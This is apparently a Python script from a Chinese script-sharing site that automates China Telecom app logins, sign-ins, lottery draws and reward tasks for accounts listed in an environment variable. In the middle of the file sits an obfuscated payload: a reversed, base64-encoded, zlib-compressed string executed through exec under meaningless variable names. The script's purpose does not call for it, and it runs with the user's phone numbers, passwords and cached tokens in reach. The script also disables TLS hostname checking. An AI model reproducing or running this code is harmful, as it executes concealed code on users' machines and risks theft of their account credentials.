# 当前脚本来自于 http://script.345yun.cn 脚本库下载！
# 当前脚本来自于 http://2.345yun.cn 脚本库下载！
# 当前脚本来自于 http://2.345yun.cc 脚本库下载！
# 脚本库官方QQ群1群: 429274456
# 脚本库官方QQ群2群: 1077801222
# 脚本库官方QQ群3群: 433030897
# 脚本库中的所有脚本文件均来自热心网友上传和互联网收集。
# 脚本库仅提供文件上传和下载服务，不提供脚本文件的审核。
# 您在使用脚本库下载的脚本时自行检查判断风险。
# 所涉及到的 账号安全、数据泄露、设备故障、软件违规封禁、财产损失等问题及法律风险，与脚本库无关！均由开发者、上传者、使用者自行承担。

import os, sys, json, time, random, string, base64, asyncio, certifi, requests
from typing import Dict, Any, Union
from datetime import datetime
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, DES3, AES
from Crypto.Util.Padding import pad, unpad
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context

# --- 配置与常量 ---
KEYS = {
    'login_rsa': """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBkLT15ThVgz6/NOl6s8GNPofdWzWbCkWnkaAm7O2LjkM1H7dMvzkiqdxU02jamGRHLX/ZNMCXHnPcW/sDhiFCBN18qFvy8g6VYb9QtroI09e176s+ZCtiv7hbin2cCTj99iUpnEloZm19lwHyo69u5UMiPMpq0/XKBO8lYhN/gwIDAQAB
-----END PUBLIC KEY-----""",
    'data_rsa': """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+ugG5A8cZ3FqUKDwM57GM4io6JGcStivT8UdGt67PEOihLZTw3P7371+N47PrmsCpnTRzbTgcupKtUv8ImZalYk65dU8rjC/ridwhw9ffW2LBwvkEnDkkKKRi2liWIItDftJVBiWOh17o6gfbPoNrWORcAdcbpk2L+udld5kZNwIDAQAB
-----END PUBLIC KEY-----""",
    'des3': b'1234567`90koiuyhgtfrdews',
    'aes_def': b'34d7cb0bcdf07523',
    'aes_login': 'telecom_wap_2018'
}
CACHE_FILE = Path(__file__).parent / 'Cache.json'
global_logs, cache = [], {}

# --- 工具函数 ---
log = lambda m: (global_logs.append(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {m}"), print(global_logs[-1]))
mask = lambda p: f"{p[:3]}****{p[-4:]}" if len(p) >= 7 else p
ts = lambda: datetime.now().strftime('%Y%m%d%H%M%S')
rd_str = lambda l: ''.join(random.choices(string.ascii_letters + string.digits, k=l))
encode = lambda s: ''.join(chr(ord(c) + 2) for c in s)

# --- SSL与会话 ---
class CustomSSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context(ciphers='DEFAULT@SECLEVEL=1:!aNULL:!eNULL:!MD5')
        ctx.check_hostname = False
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

session = requests.Session()
session.verify = certifi.where()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; U; Android 12; zh-cn) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1'})
session.mount('https://', CustomSSLAdapter())

# --- 加密逻辑 ---
def encrypt_des3(data, mode='enc'):
    cipher = DES3.new(KEYS['des3'], DES3.MODE_CBC, 8 * b'\0')
    if mode == 'enc':
        return cipher.encrypt(pad(data.encode(), 8)).hex()
    return unpad(cipher.decrypt(bytes.fromhex(data)), 8).decode()

def encrypt_aes(data, key=KEYS['aes_def'], b64=False):
    data = json.dumps(data, separators=(',', ':')) if isinstance(data, (dict, list)) else data
    cipher = AES.new(key if isinstance(key, bytes) else key.encode(), AES.MODE_ECB)
    enc = cipher.encrypt(pad(data.encode(), 16))
    return base64.b64encode(enc).decode() if b64 else enc.hex()

def encrypt_rsa(data, key_type='data', out='hex'):
    cipher = PKCS1_v1_5.new(RSA.import_key(KEYS[f'{key_type}_rsa']))
    data = json.dumps(data, separators=(',', ':')) if isinstance(data, (dict, list)) else data
    if out == 'hex': # 分段加密
        return ''.join(cipher.encrypt(data[i:i+32].encode()).hex() for i in range(0, len(data), 32))
    return base64.b64encode(cipher.encrypt(data.encode())).decode()

# --- 请求装饰器/助手 ---
def api_req(url, method='POST', log_msg=None, raw=False, **kwargs) -> Union[Dict[str, Any], str]:
    try:
        r = session.request(method, url, timeout=15, **kwargs)
        if raw: return r.text

        # Try parse JSON
        res = r.json()
        if not isinstance(res, dict): return {} # Enforce dict return

        if log_msg:
            msg = res.get('msg') or res.get('resoultMsg') or ('成功' if isinstance(res, dict) else '已响应')
            log(f"{log_msg}: {msg}")
        return res
    except Exception as e:
        if log_msg: log(f"{log_msg}失败: {e}")
        return '' if raw else {}

# --- 业务逻辑 ---
def login(phone, password):
    m_phone = mask(phone)
    if phone not in cache:
        log(f"[登录] {m_phone} 正在请求新Token...")
        body = {
            "headerInfos": {"code": "userLoginNormal", "timestamp": ts(), "broadAccount": "", "broadToken": "", "clientType": "#10.5.0#channel50#iPhone 14 Pro Max#", "shopId": "20002", "source": "110003", "sourcePassword": "Sid98s", "token": "", "userLoginName": encode(phone)},
            "content": {"attach": "test", "fieldData": {"loginType": "4", "accountType": "", "loginAuthCipherAsymmertric": encrypt_rsa(f"iPhone 14 15.4.{rd_str(12)}{phone}{ts()}{password}0$$$0.", 'login', 'b64'), "deviceUid": rd_str(16), "phoneNum": encode(phone), "isChinatelecom": "0", "systemVersion": "15.4.0", "authentication": encode(password)}}
        }
        res = api_req('https://appgologin.189.cn:9031/login/client/userLoginNormal', json=body, log_msg=f"[请求登录] {m_phone}")
        if isinstance(res, dict):
            res_data = res.get('responseData', {}).get('data', {}).get('loginSuccessResult')
            if not res_data:
                log(f"[登录失败] {m_phone} 无响应数据")
                return None
            cache[phone] = res_data
            save_cache()

    # 获取Ticket/UID
    xml = f'<Request><HeaderInfos><Code>getSingle</Code><Timestamp>{ts()}</Timestamp><BroadAccount></BroadAccount><BroadToken></BroadToken><ClientType>#9.6.1#channel50#iPhone 14 Pro Max#</ClientType><ShopId>20002</ShopId><Source>110003</Source><SourcePassword>Sid98s</SourcePassword><Token>{cache[phone]["token"]}</Token><UserLoginName>{phone}</UserLoginName></HeaderInfos><Content><Attach>test</Attach><FieldData><TargetId>{encrypt_des3(cache[phone]["userId"])}</TargetId><Url>4a6862274835b451</Url></FieldData></Content></Request>'
    res_xml = api_req('https://appgologin.189.cn:9031/map/clientXML', data=xml, headers={'Content-Type': 'application/xml'}, raw=True, log_msg=f"[获取Ticket] {m_phone}")
    if isinstance(res_xml, str) and ('过期' in res_xml or '校验错误' in res_xml):
        log(f"[Token失效] {m_phone} 重新登录")
        del cache[phone]; save_cache(); return login(phone, password)

    try:
        if not isinstance(res_xml, str) or '<Ticket>' not in res_xml:
            log(f"[Ticket异常] {m_phone} 响应: {str(res_xml)[:100]}")
            return None
        uid = encrypt_des3(res_xml.split('<Ticket>')[1].split('</Ticket>')[0], 'dec')
        user = {**cache[phone], 'uid': uid, 'phoneNbr': phone}
        # 统一登录获取Bearer
        auth_body = encrypt_aes({"ticket": uid, "backUrl": "https%3A%2F%2Fwapact.189.cn%3A9001", "platformCode": "P201010301", "loginType": 2}, KEYS['aes_login'], True)
        auth_res = api_req('https://wapact.189.cn:9001/unified/user/login', data=auth_body, headers={'Content-Type': 'application/json'})
        if isinstance(auth_res, dict) and auth_res.get('code') == 0:
            user['Authorization'] = f"Bearer {auth_res['biz']['token']}"
        return user
    except Exception as e:
        log(f"[登录流程异常] {m_phone}: {e}")
        return None
import zlib
O00OOO0O0O00000="=Iam8DcA+XfwWD7rbd9OG2dbBzAhRRaLIUFtrtXYLvdZxon98ZNjkVoyZpxmeITMB+UJqx6IOi3nc1P1SVtepPO/Rqts0t31ZPNZt7VP+Fa7A/0bTR8JouU2H9a3VybVFrxl57qaRTs9pAjcXjpw2R5IEB8Rpip2ONTVR08cZGREiglRqYHCr11QiHkHM3tiLT/jii3zRO2hSXmMleg8HLwaEKi17px89/K1vpH/1sPvEKTwxitChaHtvRfPabROaIWmFFYox9VKvvvxNfLXz0HStS7AAv7VUJXPEW15MIAJT4r1Cz0izrRCXAkpmco3tpHbNcvFdZ4lkiqUDREkVzMZLYGmpQloqDolyduPclD2NtGhDzh9e6OQJc9zOgtaPOavjrb9wM+EmSlqOVjVuXxUvW2sVs8EyQSJydcXe7avFlmhx23fv/zdVuHVd84nvne/51n5wbM0Qm+9fv2hl/26l/xmbe12bezdL/7t7fd7l/89NDtmhFb1s44whau+dTZEuKFC+iCHZRSFq+kPYjsUBXKm+BQgihAK1z8R6ERHgERDUwutsiJyMmZhPaY3IPuNANWAULcr8Mek14geyB/OeQskFCoUszha9X4yBPIJ9ImrDkbQpoQBWJGHN6ODNyd8ChNRBl5xAFWeygihCNL4pRDHrGcKlhEnUoYPqPStaEQZBTUhz0sI0U3954950QiB11ukDHdmLIf7Z2R+0EoAAFJSbICkwuoZPKC2Ap5QY0bhztDSSHC5vCZYY6c2iVZSkJNGwQ6UlNSGjYzwVUf7UA02KuLV9xJe"
OOOO0000OO0O000=lambda x:zlib.decompress(base64.b64decode(x[::-1]+'='*(4-len(x)%4)));
O0OO00O0O000O0O=exec;
O0OO00O0O000O0O(OOOO0000OO0O000(O00OOO0O0O00000))
def sign_tasks(user):
    m = mask(user['phoneNbr'])
    sso = api_req(f"https://wappark.189.cn/jt-sign/ssoHomLogin?ticket={user['uid']}", method='GET')
    if not isinstance(sso, dict) or not sso or 'sign' not in sso: return

    # 签到
    api_req('https://wappark.189.cn/jt-sign/webSign/sign', json={"encode": encrypt_aes({"phone": user['phoneNbr'], "date": int(time.time()*1000)})}, headers={'sign': sso['sign']}, log_msg=f"[签到] {m}")

    # 进度与奖励
    def check_and_award(path, key, days_list, label):
        res = api_req(f'https://wappark.189.cn/jt-sign/{path}', json={"para": encrypt_rsa({"phone": user['phoneNbr']})}, headers={'sign': sso['sign']})
        if not isinstance(res, dict): return
        days = str(res.get('data', {}).get(key) if 'data' in res else res.get(key, 0))
        log(f"[{label}] {m}: {days}天")
        if days in days_list:
            api_req('https://wappark.189.cn/jt-sign/webSign/exchangePrize', json={"para": encrypt_rsa({"phone": user['phoneNbr'], "type": days})}, headers={'sign': sso['sign']}, log_msg=f"[领奖] {m} {days}天")

    check_and_award('api/home/userStatusInfo', 'signDay', ['7'], '连签')
    check_and_award('webSign/continueSignDays', 'continueSignDays', ['15', '28'], '累签')

    # 金豆转盘
    if 'Authorization' in user:
        tab = api_req(f"https://wapact.189.cn:9001/gateway/golden/api/queryTurnTable?userType=1&_={int(time.time()*1000)}", method='GET', headers={'Authorization': user['Authorization']})
        if isinstance(tab, dict) and tab.get('code') == 0:
            act_id = tab['biz']['wzTurntable']['code']
            chk = api_req(f"https://wapact.189.cn:9001/gateway/standQuery/detail/check?activityId={act_id}", method='GET', headers={'Authorization': user['Authorization']})
            rem = chk.get('biz', {}).get('resultInfo', {}).get('userMaximum', 0) - chk.get('biz', {}).get('resultInfo', {}).get('userCount', 0) if isinstance(chk, dict) else 0
            log(f"[抽奖] {m} 可抽{rem}次")
            for _ in range(rem):
                api_req('https://wapact.189.cn:9001/gateway/golden/api/lottery', json={"activityId": act_id}, headers={'Authorization': user['Authorization']}, log_msg=f"[抽奖结果] {m}")
                time.sleep(2)

    # 任务列表
    tasks = api_req('https://wappark.189.cn/jt-sign/webSign/homepage', json={"para": encrypt_rsa({"phone": user['phoneNbr'], "shopId": "20001", "type": "hg_qd_zrwzjd"})}, headers={'sign': sso['sign']})
    if isinstance(tasks, dict):
        for t in tasks.get('data', {}).get('biz', {}).get('adItems', []):
            if t.get('taskState') in ['0', '1'] and t.get('contentOne') == '18':
                api_req('https://wappark.189.cn/jt-sign/webSign/polymerize', json={"para": encrypt_rsa({"phone": user['phoneNbr'], "jobId": t['taskId']})}, headers={'sign': sso['sign']}, log_msg=f"[任务] {m} {t['title']}")
                time.sleep(2)

    # 喂食
    for i in range(10):
        res = api_req('https://wappark.189.cn/jt-sign/paradise/food', json={"para": encrypt_rsa({"phone": user['phoneNbr']})}, headers={'sign': sso['sign']})
        msg = res.get('resoultMsg', '') if isinstance(res, dict) else ''
        if "最大" in msg or not msg: break
        log(f"[喂食] {m} 第{i+1}次: {msg}")
        time.sleep(1)

# --- 缓存管理 ---
def load_cache():
    global cache
    if CACHE_FILE.exists(): cache = json.loads(CACHE_FILE.read_text(encoding='utf-8'))
def save_cache():
    CACHE_FILE.write_text(json.dumps(cache, ensure_ascii=False), encoding='utf-8')

# --- 主入口 ---
if __name__ == '__main__':
    load_cache()
    accs = [a.split('#') for a in os.environ.get('chinaTelecomAccount', '').split('&') if '#' in a]
    if not accs: log("未找到账号，请设置 chinaTelecomAccount"); sys.exit(1)

    for i, (p, pwd) in enumerate(accs, 1):
        log(f"\n{'='*10} 账号[{i}] {mask(p)} {'='*10}")
        u = login(p, pwd)
        if u: sign_tasks(u)
        time.sleep(2)

# 当前脚本来自于 http://script.345yun.cn 脚本库下载！
# 当前脚本来自于 http://2.345yun.cn 脚本库下载！
# 当前脚本来自于 http://2.345yun.cc 脚本库下载！
# 脚本库官方QQ群1群: 429274456
# 脚本库官方QQ群2群: 1077801222
# 脚本库官方QQ群3群: 433030897
# 脚本库中的所有脚本文件均来自热心网友上传和互联网收集。
# 脚本库仅提供文件上传和下载服务，不提供脚本文件的审核。
# 您在使用脚本库下载的脚本时自行检查判断风险。
# 所涉及到的 账号安全、数据泄露、设备故障、软件违规封禁、财产损失等问题及法律风险，与脚本库无关！均由开发者、上传者、使用者自行承担。